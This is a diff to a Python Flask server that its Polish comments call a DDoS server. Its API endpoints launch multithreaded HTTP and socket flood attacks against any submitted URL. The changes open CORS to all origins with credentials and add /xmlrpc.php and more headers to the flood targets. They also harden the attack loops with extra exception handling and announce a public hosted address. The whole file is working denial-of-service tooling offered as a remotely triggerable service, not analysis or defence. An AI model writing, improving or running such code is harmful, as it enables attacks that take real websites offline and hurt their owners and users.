@@ -20,7 +20,18 @@ logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
 app = Flask(__name__)
-CORS(app, origins=["https://socialtool.work.gd", "https://www.socialtool.work.gd"])
+
+# ==== POPRAWIONA KONFIGURACJA CORS ====
+CORS(app, origins="*", supports_credentials=True)
+
+# Dodatkowe nagłówki CORS dla pewności
+@app.after_request
+def after_request(response):
+    response.headers.add('Access-Control-Allow-Origin', '*')
+    response.headers.add('Access-Control-Allow-Headers', 'Content-Type,Authorization,X-Requested-With')
+    response.headers.add('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE,OPTIONS')
+    response.headers.add('Access-Control-Allow-Credentials', 'true')
+    return response
 
 # ==== GLOBALNE ZMIENNE DLA ATAKÓW ====
 active_attacks = {}
@@ -57,11 +68,15 @@ def website_killer_attack(target_url, threads_count=200, attack_id=None):
     attack_stop_flags[attack_id] = False
     
     # Parsuj URL
-    parsed = urlparse(target_url)
-    host = parsed.hostname
-    port = parsed.port or (443 if parsed.scheme == 'https' else 80)
-    path = parsed.path or '/'
-    use_https = parsed.scheme == 'https'
+    try:
+        parsed = urlparse(target_url)
+        host = parsed.hostname
+        port = parsed.port or (443 if parsed.scheme == 'https' else 80)
+        path = parsed.path or '/'
+        use_https = parsed.scheme == 'https'
+    except Exception as e:
+        logger.error(f"Błąd parsowania URL: {e}")
+        return attack_id
     
     print(f"{Colors.RED}=== WEB SITE KILLER ATTACK ==={Colors.END}")
     print(f"{Colors.YELLOW}>> Cel: {target_url}{Colors.END}")
@@ -82,7 +97,7 @@ def website_killer_attack(target_url, threads_count=200, attack_id=None):
     
     # Lista ścieżek do ataku (oprócz głównej)
     paths = ['/', '/index.html', '/index.php', '/wp-admin', '/wp-login.php', 
-             '/admin', '/login', '/api', '/api/v1', '/graphql']
+             '/admin', '/login', '/api', '/api/v1', '/graphql', '/xmlrpc.php']
     
     def flood_http():
         """Wątek ataku przez HTTP/HTTPS (requests)"""
@@ -107,7 +122,8 @@ def website_killer_attack(target_url, threads_count=200, attack_id=None):
                     'Accept-Language': random.choice(['pl-PL,pl;q=0.9', 'en-US,en;q=0.9']),
                     'Connection': 'keep-alive',
                     'Cache-Control': 'no-cache',
-                    'Pragma': 'no-cache'
+                    'Pragma': 'no-cache',
+                    'Upgrade-Insecure-Requests': '1',
                 }
                 
                 # Wykonaj zapytanie - nie czekamy na odpowiedź
@@ -115,6 +131,10 @@ def website_killer_attack(target_url, threads_count=200, attack_id=None):
                 attack_stats[attack_id]["requests"] += 1
                 local_count += 1
                 
+            except requests.exceptions.Timeout:
+                attack_stats[attack_id]["requests"] += 1
+            except requests.exceptions.ConnectionError:
+                attack_stats[attack_id]["requests"] += 1
             except Exception:
                 attack_stats[attack_id]["requests"] += 1
             
@@ -162,6 +182,10 @@ def website_killer_attack(target_url, threads_count=200, attack_id=None):
                 attack_stats[attack_id]["requests"] += 1
                 local_count += 1
                 
+            except ConnectionRefusedError:
+                attack_stats[attack_id]["requests"] += 1
+            except socket.timeout:
+                attack_stats[attack_id]["requests"] += 1
             except Exception:
                 attack_stats[attack_id]["requests"] += 1
             
@@ -188,7 +212,7 @@ def website_killer_attack(target_url, threads_count=200, attack_id=None):
 
 # ==== ENDPOINTY API ====
 
-@app.route('/api/status', methods=['GET'])
+@app.route('/api/status', methods=['GET', 'OPTIONS'])
 def status():
     """Status serwera DDoS"""
     return jsonify({
@@ -198,7 +222,7 @@ def status():
         "total_requests": sum(s.get('requests', 0) for s in attack_stats.values())
     })
 
-@app.route('/api/attack/start', methods=['POST'])
+@app.route('/api/attack/start', methods=['POST', 'OPTIONS'])
 def start_attack():
     """Rozpoczyna agresywny atak DDoS"""
     try:
@@ -228,9 +252,10 @@ def start_attack():
             "message": "Agresywny atak DDoS rozpoczęty"
         })
     except Exception as e:
+        logger.error(f"Błąd w start_attack: {e}")
         return jsonify({"success": False, "error": str(e)}), 500
 
-@app.route('/api/attack/stop/<attack_id>', methods=['POST'])
+@app.route('/api/attack/stop/<attack_id>', methods=['POST', 'OPTIONS'])
 def stop_attack(attack_id):
     """Zatrzymuje atak"""
     try:
@@ -248,7 +273,7 @@ def stop_attack(attack_id):
     except Exception as e:
         return jsonify({"success": False, "error": str(e)}), 500
 
-@app.route('/api/attack/status/<attack_id>', methods=['GET'])
+@app.route('/api/attack/status/<attack_id>', methods=['GET', 'OPTIONS'])
 def attack_status(attack_id):
     """Status konkretnego ataku"""
     try:
@@ -271,7 +296,7 @@ def attack_status(attack_id):
     except Exception as e:
         return jsonify({"success": False, "error": str(e)}), 500
 
-@app.route('/api/attacks', methods=['GET'])
+@app.route('/api/attacks', methods=['GET', 'OPTIONS'])
 def list_attacks():
     """Lista aktywnych ataków"""
     attacks_list = []
@@ -296,7 +321,7 @@ def list_attacks():
         "attacks": attacks_list
     })
 
-@app.route('/', methods=['GET'])
+@app.route('/', methods=['GET', 'OPTIONS'])
 def index():
     """Strona główna serwera DDoS"""
     return jsonify({
@@ -358,5 +383,7 @@ if __name__ == "__main__":
     
     print(f"🚀 Serwer DDoS uruchomiony na porcie {port}")
     print(f"📡 Endpoint: http://localhost:{port}/api/attack/start")
+    print(f"🌐 Publiczny adres: https://social-tools-ddos.onrender.com")
+    print(f"🔓 CORS: Zezwolono na wszystkie domeny")
     
     app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
